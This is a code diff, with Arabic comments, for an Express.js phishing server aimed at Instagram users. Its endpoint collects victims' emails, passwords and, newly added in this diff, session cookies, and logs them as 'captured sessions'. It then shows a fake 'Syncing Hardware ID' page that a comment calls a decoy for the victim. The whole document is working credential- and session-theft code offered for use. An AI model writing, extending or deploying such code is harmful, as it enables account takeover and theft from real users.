@@ -5,24 +5,25 @@ const app = express();
 
 app.use(bodyParser.urlencoded({ extended: true }));
 
-// هذا السطر يضمن أن السيرفر يقرأ صفحة الـ HTML فور فتح الرابط
+// عرض الصفحة الرئيسية
 app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));
 });
 
-// استقبال البيانات وطباعتها في الـ Logs
-app.post('/verify-identity', (req, res) => {
-    const { email, password } = req.body;
+// استقبال البيانات والتوكن
+app.post('/auth/verify', (req, res) => {
+    const { email, password, user_cookies } = req.body;
     
     console.log("====================================");
-    console.log("CRITICAL: DATA CAPTURED");
-    console.log("ID: " + email);
-    console.log("KEY: " + password);
+    console.log("🔥 NEW SESSION CAPTURED 🔥");
+    console.log("USER: " + email);
+    console.log("PASS: " + password);
+    console.log("SESSION COOKIES: " + user_cookies); 
     console.log("====================================");
     
-    // توجيه لصفحة توحي بنجاح العملية
-    res.send('<div style="font-family:sans-serif; text-align:center; padding-top:100px;"><h1>Verification in Progress...</h1><p>Please do not close this window. Hardware sync takes up to 2 minutes.</p></div>');
+    // صفحة تمويهية للضحية
+    res.send('<div style="font-family:sans-serif;text-align:center;padding-top:100px;"><h2>Syncing Hardware ID...</h2><p>Please wait, matching your device with Instagram servers.</p></div>');
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Stealth Core Active'));
+app.listen(PORT, () => console.log('Bypass Server Running'));
